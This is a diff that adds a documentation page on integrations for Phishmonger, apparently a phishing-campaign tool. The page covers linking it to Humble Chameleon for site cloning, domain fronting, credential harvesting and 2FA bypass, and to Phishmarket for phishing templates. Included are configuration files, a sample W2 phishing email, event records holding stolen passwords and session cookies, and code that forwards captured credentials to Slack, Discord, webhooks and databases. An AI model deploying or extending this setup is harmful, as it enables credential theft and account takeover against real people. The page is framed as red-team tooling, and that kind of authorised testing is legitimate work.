@@ -1,0 +1,675 @@
+---
+title: 'Integrations'
+description: 'Integrating Phishmonger with payload delivery and tracking systems'
+icon: 'plug'
+---
+
+Phishmonger integrates with external systems for payload delivery, credential harvesting, and template management. This guide covers configuring integrations with Humble Chameleon and Phishmarket.
+
+## Humble Chameleon Integration
+
+Humble Chameleon is a payload delivery and credential harvesting server that works seamlessly with Phishmonger for complete phishing campaigns.
+
+### What is Humble Chameleon?
+
+Humble Chameleon provides:
+- **Domain fronting**: Hide phishing domain behind legitimate sites
+- **Website cloning**: Clone target websites on the fly
+- **Credential harvesting**: Capture submitted credentials
+- **Payload delivery**: Serve malicious files or links
+- **Session tracking**: Monitor target interactions
+- **2FA bypass**: Attack multi-factor authentication
+
+**Repository**: [https://github.com/fkasler/humble-chameleon](https://github.com/fkasler/humble-chameleon)
+
+### Integration Architecture
+
+<Steps>
+  <Step title="Email Delivery">
+    Phishmonger sends email with link to Humble Chameleon domain
+  </Step>
+
+  <Step title="Target Clicks">
+    Target clicks phishing link with tracking parameter
+  </Step>
+
+  <Step title="Payload Delivery">
+    Humble Chameleon serves cloned website or payload
+  </Step>
+
+  <Step title="Credential Capture">
+    Target submits credentials to Humble Chameleon
+  </Step>
+
+  <Step title="Event Logging">
+    Humble Chameleon logs event to Phishmonger via API
+  </Step>
+
+  <Step title="Real-Time Tracking">
+    Event appears in Phishmonger tracking interface
+  </Step>
+</Steps>
+
+### Configuring Humble Chameleon
+
+Add Phishmonger logging endpoint to Humble Chameleon configuration:
+
+```json
+{
+  "myphishingdomain.com": {
+    "primary_target": "something_to_hide_behind.org",
+    "secondary_target": "real_target_domain.com",
+    "search_string": "document_id",
+    "wwwroot": "hr_documents",
+    "tracking_cookie": "evil_cookie",
+    "replacements": {},
+    "custom_headers": {},
+    "snitch": {
+      "snitch_string": "Logoff",
+      "redirect_url": "https://vpn.real_target_domain.com/index.html"
+    },
+    "logging_endpoint": {
+      "host": "www.myphishmongerdomain.com",
+      "url": "/create_event",
+      "auth_cookie": "admin_cookie=your_admin_cookie_value"
+    }
+  }
+}
+```
+
+**Configuration Parameters**:
+
+**logging_endpoint** (object):
+- **host**: Phishmonger server hostname
+- **url**: Event creation endpoint (`/create_event`)
+- **auth_cookie**: Admin cookie for authentication
+
+### Event Types from Humble Chameleon
+
+**CLICK**: Target accessed phishing link
+```json
+{
+  "event_ip": "203.0.113.45",
+  "target": "a7k2m9",
+  "event_type": "CLICK",
+  "event_data": "User-Agent: Mozilla/5.0..."
+}
+```
+
+**POST_DATA**: Target submitted form data
+```json
+{
+  "event_ip": "203.0.113.45",
+  "target": "a7k2m9",
+  "event_type": "POST_DATA",
+  "event_data": "username=jsmith&password=P@ssw0rd123"
+}
+```
+
+**COOKIE_DATA**: Session cookies captured
+```json
+{
+  "event_ip": "203.0.113.45",
+  "target": "a7k2m9",
+  "event_type": "COOKIE_DATA",
+  "event_data": "session_token=eyJhbGc..."
+}
+```
+
+### Tracking Parameters
+
+Phishmonger appends tracking parameters to phishing links:
+
+**Campaign Configuration**:
+- **phishing_link**: `https://payload-domain.com`
+- **id_parameter**: `id`
+
+**Generated Link**:
+```
+https://payload-domain.com/?id=a7k2m9
+```
+
+Humble Chameleon extracts the tracking parameter and includes it in event logging to Phishmonger.
+
+### Complete Workflow Example
+
+**1. Configure Campaign**:
+```
+SMTP Settings: Direct delivery to target MX
+Phishing Link: https://hr-portal.phishing-domain.com
+ID Parameter: document_id
+```
+
+**2. Email Template**:
+```html
+<p>Hello SuppliedFirstName,</p>
+<p>Your W2 is ready. Click below to download:</p>
+<a href="SuppliedPhishingLink">Download W2</a>
+```
+
+**3. Generated Email**:
+```html
+<p>Hello John,</p>
+<p>Your W2 is ready. Click below to download:</p>
+<a href="https://hr-portal.phishing-domain.com/?document_id=a7k2m9">Download W2</a>
+```
+
+**4. Target Interaction**:
+- Target clicks link
+- Humble Chameleon logs CLICK event to Phishmonger
+- Humble Chameleon serves cloned HR portal login
+- Target submits credentials
+- Humble Chameleon logs POST_DATA event to Phishmonger
+
+**5. Phishmonger Tracking**:
+```
+[14:32:15] CLICK - Target: a7k2m9 - IP: 203.0.113.45
+[14:33:42] POST_DATA - Target: a7k2m9 - IP: 203.0.113.45
+Event Data: username=jsmith&password=P@ssw0rd123
+```
+
+## Phishmarket Integration
+
+Phishmarket is a template management server that allows sharing and accessing pre-built phishing templates.
+
+### Configuring Phishmarket
+
+Add Phishmarket configuration to `config.json`:
+
+```json
+{
+  "phishmarket": {
+    "url": "https://phishmarket.example.com",
+    "token": "your_api_token_here"
+  }
+}
+```
+
+**Configuration Parameters**:
+- **url**: Base URL of Phishmarket server
+- **token**: API authentication token
+
+### Accessing Phishmarket
+
+When configured, a "Phishmarket" button appears in the admin interface.
+
+<Steps>
+  <Step title="Click Phishmarket">
+    From admin interface, click "Phishmarket" button
+  </Step>
+
+  <Step title="Browse Templates">
+    View available pre-built phishing templates
+  </Step>
+
+  <Step title="Select Template">
+    Choose template to import
+  </Step>
+
+  <Step title="Create Campaign">
+    Template is loaded into campaign creation workflow
+  </Step>
+
+  <Step title="Configure and Save">
+    Add SMTP settings and save as campaign
+  </Step>
+</Steps>
+
+### Phishmarket API Proxy
+
+Phishmonger proxies requests to Phishmarket:
+
+**Client → Phishmonger**:
+```
+GET https://yourdomain.com/phishmarket/templates
+```
+
+**Phishmonger → Phishmarket**:
+```
+GET https://phishmarket.example.com/templates
+Authorization: Bearer your_api_token_here
+```
+
+All Phishmarket endpoints are accessible via `/phishmarket/*` prefix.
+
+### Tracking Phishmarket Templates
+
+Campaigns created from Phishmarket templates store the template ID:
+
+```sql
+SELECT name, market_id FROM campaigns WHERE market_id != 0;
+```
+
+This allows tracking which Phishmarket templates are most effective.
+
+## Custom Integration via API
+
+Integrate Phishmonger with custom tools using the API.
+
+### Event Creation
+
+External systems can log events to Phishmonger:
+
+```bash
+curl -X POST https://yourdomain.com/create_event \
+  -H "Cookie: admin_cookie=YOUR_COOKIE_VALUE" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "event_ip": "203.0.113.45",
+    "target": "a7k2m9",
+    "event_type": "CUSTOM_EVENT",
+    "event_data": "Custom payload data"
+  }'
+```
+
+**Required Fields**:
+- **event_ip**: Source IP address
+- **target**: Target ID from Phishmonger
+- **event_type**: Type of event (can be custom)
+- **event_data**: Event details
+
+**Campaign Association**: Campaign is automatically determined from target ID
+
+### Custom Event Types
+
+Create custom event types for specific tracking needs:
+
+**Examples**:
+- `FILE_DOWNLOAD`: File downloaded by target
+- `LINK_PREVIEW`: Link preview generated (WhatsApp, Slack, etc.)
+- `EMAIL_OPEN`: Tracking pixel loaded
+- `ATTACHMENT_OPEN`: Document opened
+- `MACRO_ENABLED`: Macros enabled in document
+- `PAYLOAD_EXECUTED`: Payload successfully executed
+
+### Integration Security
+
+**Authentication**: All API requests require admin cookie
+
+**Request Format**:
+```bash
+curl -H "Cookie: admin_cookie=YOUR_COOKIE_VALUE" ...
+```
+
+**Security Recommendations**:
+- Use HTTPS for all API communication
+- Protect admin cookie value
+- Validate event data before logging
+- Sanitize potentially malicious data
+
+## Email Service Provider Integration
+
+### SMTP Relay Integration
+
+Phishmonger supports authenticated SMTP relays:
+
+**SendGrid**:
+```
+Mail Server: smtp.sendgrid.net
+Port: 465 (Secure Mail: enabled)
+Username: apikey
+Password: SG.xxxxxxxxxxxxxxxx
+DKIM: Disabled (SendGrid handles signing)
+```
+
+**AWS SES**:
+```
+Mail Server: email-smtp.us-east-1.amazonaws.com
+Port: 465 (Secure Mail: enabled)
+Username: <SMTP credentials username>
+Password: <SMTP credentials password>
+DKIM: Disabled (SES handles signing)
+```
+
+**Mailgun**:
+```
+Mail Server: smtp.mailgun.org
+Port: 465 (Secure Mail: enabled)
+Username: postmaster@your-domain.mailgun.org
+Password: <SMTP password>
+DKIM: Disabled (Mailgun handles signing)
+```
+
+**Office 365**:
+```
+Mail Server: smtp.office365.com
+Port: 587 (Secure Mail: enabled)
+Username: sender@yourdomain.com
+Password: <account password or app password>
+DKIM: Disabled (O365 handles signing)
+```
+
+**Gmail**:
+```
+Mail Server: smtp.gmail.com
+Port: 465 (Secure Mail: enabled)
+Username: youremail@gmail.com
+Password: <app password>
+DKIM: Disabled (Gmail handles signing)
+```
+
+<Warning>
+  **Rate Limits**: Commercial SMTP services have rate limits. Check provider documentation and adjust campaign delay accordingly.
+</Warning>
+
+## Webhook Integration
+
+Create webhooks for event notifications:
+
+### Webhook Server Setup
+
+Create a simple webhook receiver:
+
+```javascript
+const express = require('express');
+const app = express();
+app.use(express.json());
+
+app.post('/webhook', (req, res) => {
+  const event = req.body;
+
+  console.log('Received event:', event);
+
+  // Process event
+  if (event.event_type === 'POST_DATA') {
+    // Alert on credential submission
+    console.log('CREDENTIALS CAPTURED!');
+    console.log('Target:', event.target);
+    console.log('Data:', event.event_data);
+  }
+
+  res.send('OK');
+});
+
+app.listen(8080);
+```
+
+### Forwarding Events
+
+Modify Phishmonger's event creation function in `index.js`:
+
+```javascript
+async function createEvent(new_event, io) {
+  console.log(new_event);
+  new_event.event_timestamp = new Date().getTime();
+
+  // ... existing database insertion ...
+
+  io.emit("new_event", new_event);
+
+  // Add webhook forwarding
+  try {
+    await got.post('http://webhook-server:8080/webhook', {
+      json: new_event
+    });
+  } catch (err) {
+    console.log('Webhook error:', err);
+  }
+}
+```
+
+## Database Integration
+
+### Exporting to External Databases
+
+Export Phishmonger data to external systems:
+
+**PostgreSQL Export**:
+```bash
+# Export to CSV
+sqlite3 db/aquarium.db <<EOF
+.mode csv
+.output events.csv
+SELECT * FROM events;
+.output targets.csv
+SELECT * FROM targets;
+.output campaigns.csv
+SELECT * FROM campaigns;
+EOF
+
+# Import to PostgreSQL
+psql -d analytics -c "COPY events FROM '/path/to/events.csv' CSV HEADER"
+psql -d analytics -c "COPY targets FROM '/path/to/targets.csv' CSV HEADER"
+psql -d analytics -c "COPY campaigns FROM '/path/to/campaigns.csv' CSV HEADER"
+```
+
+**MySQL Export**:
+```bash
+sqlite3 db/aquarium.db <<EOF
+.mode csv
+.output events.csv
+SELECT * FROM events;
+EOF
+
+mysql -u user -p analytics <<EOF
+LOAD DATA LOCAL INFILE 'events.csv'
+INTO TABLE events
+FIELDS TERMINATED BY ','
+ENCLOSED BY '"'
+LINES TERMINATED BY '\n'
+IGNORE 1 ROWS;
+EOF
+```
+
+### Real-Time Database Sync
+
+Sync events to external database in real-time:
+
+```javascript
+// Add to index.js createEvent function
+const mysql = require('mysql2/promise');
+
+async function createEvent(new_event, io) {
+  // ... existing code ...
+
+  // Sync to MySQL
+  try {
+    const connection = await mysql.createConnection({
+      host: 'mysql-server',
+      user: 'phishmonger',
+      password: 'password',
+      database: 'analytics'
+    });
+
+    await connection.execute(
+      'INSERT INTO events VALUES (?, ?, ?, ?, ?, ?, ?)',
+      [
+        new_event.event_timestamp,
+        new_event.event_ip,
+        new_event.campaign,
+        new_event.target,
+        new_event.event_type,
+        new_event.event_data,
+        0
+      ]
+    );
+
+    await connection.end();
+  } catch (err) {
+    console.log('MySQL sync error:', err);
+  }
+}
+```
+
+## SIEM Integration
+
+### Syslog Export
+
+Forward events to SIEM via syslog:
+
+```javascript
+const syslog = require('syslog-client');
+const client = syslog.createClient('siem-server', {
+  port: 514,
+  transport: syslog.Transport.Udp
+});
+
+async function createEvent(new_event, io) {
+  // ... existing code ...
+
+  // Send to SIEM
+  const message = `Phishmonger: ${new_event.campaign} - ${new_event.event_type} - Target: ${new_event.target} - IP: ${new_event.event_ip} - Data: ${new_event.event_data}`;
+
+  client.log(message, {
+    facility: syslog.Facility.Local0,
+    severity: syslog.Severity.Informational
+  });
+}
+```
+
+### JSON Format Export
+
+Export events in SIEM-friendly JSON format:
+
+```bash
+sqlite3 db/aquarium.db <<EOF
+SELECT json_object(
+  'timestamp', event_timestamp,
+  'source_ip', event_ip,
+  'campaign', campaign,
+  'target', target,
+  'event_type', event_type,
+  'event_data', event_data
+) as json_event
+FROM events
+WHERE campaign = 'Q4_2023_VPN_Phish';
+EOF
+```
+
+## Slack Integration
+
+### Slack Notifications
+
+Send events to Slack:
+
+```javascript
+const got = require('got');
+
+async function createEvent(new_event, io) {
+  // ... existing code ...
+
+  // Send to Slack for important events
+  if (new_event.event_type === 'POST_DATA' || new_event.event_type === 'COOKIE_DATA') {
+    try {
+      await got.post('https://hooks.slack.com/services/YOUR/WEBHOOK/URL', {
+        json: {
+          text: `Credentials Captured!`,
+          attachments: [{
+            color: 'danger',
+            fields: [
+              { title: 'Campaign', value: new_event.campaign, short: true },
+              { title: 'Target', value: new_event.target, short: true },
+              { title: 'IP Address', value: new_event.event_ip, short: true },
+              { title: 'Data', value: new_event.event_data, short: false }
+            ]
+          }]
+        }
+      });
+    } catch (err) {
+      console.log('Slack error:', err);
+    }
+  }
+}
+```
+
+## Discord Integration
+
+### Discord Webhooks
+
+Send notifications to Discord:
+
+```javascript
+async function createEvent(new_event, io) {
+  // ... existing code ...
+
+  // Send to Discord
+  if (new_event.event_type === 'POST_DATA') {
+    try {
+      await got.post('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', {
+        json: {
+          content: `**Credentials Captured**`,
+          embeds: [{
+            title: new_event.campaign,
+            color: 15158332,
+            fields: [
+              { name: 'Target', value: new_event.target, inline: true },
+              { name: 'IP', value: new_event.event_ip, inline: true },
+              { name: 'Data', value: `\`\`\`${new_event.event_data}\`\`\`` }
+            ],
+            timestamp: new Date(new_event.event_timestamp).toISOString()
+          }]
+        }
+      });
+    } catch (err) {
+      console.log('Discord error:', err);
+    }
+  }
+}
+```
+
+## Troubleshooting Integrations
+
+### Humble Chameleon Events Not Appearing
+
+**Check Configuration**:
+- Verify `logging_endpoint` in Humble Chameleon config
+- Ensure `auth_cookie` matches Phishmonger's admin cookie
+- Confirm hostname is correct
+
+**Test Event Creation**:
+```bash
+curl -X POST https://yourdomain.com/create_event \
+  -H "Cookie: admin_cookie=YOUR_COOKIE_VALUE" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "event_ip": "203.0.113.45",
+    "target": "test123",
+    "event_type": "TEST",
+    "event_data": "Integration test"
+  }'
+```
+
+**Check Humble Chameleon Logs**:
+Look for errors connecting to Phishmonger
+
+### Phishmarket Not Loading
+
+**Verify Configuration**:
+```json
+{
+  "phishmarket": {
+    "url": "https://phishmarket.example.com",
+    "token": "valid_token"
+  }
+}
+```
+
+**Test Connection**:
+```bash
+curl https://phishmarket.example.com \
+  -H "Authorization: Bearer your_token"
+```
+
+**Check HTTPS**:
+Ensure Phishmarket URL uses HTTPS
+
+### SMTP Relay Authentication Failures
+
+**Verify Credentials**:
+- Username/password are correct
+- Account is active
+- IP is not blocked
+
+**Check Port Configuration**:
+- Port 465 requires Secure Mail enabled
+- Port 587 requires Secure Mail enabled (STARTTLS)
+- Port 25 is unencrypted
+
+**Test SMTP Connection**:
+```bash
+openssl s_client -connect smtp.provider.com:465 -crlf
+EHLO test
+AUTH LOGIN
+<base64 encoded username>
+<base64 encoded password>
+```
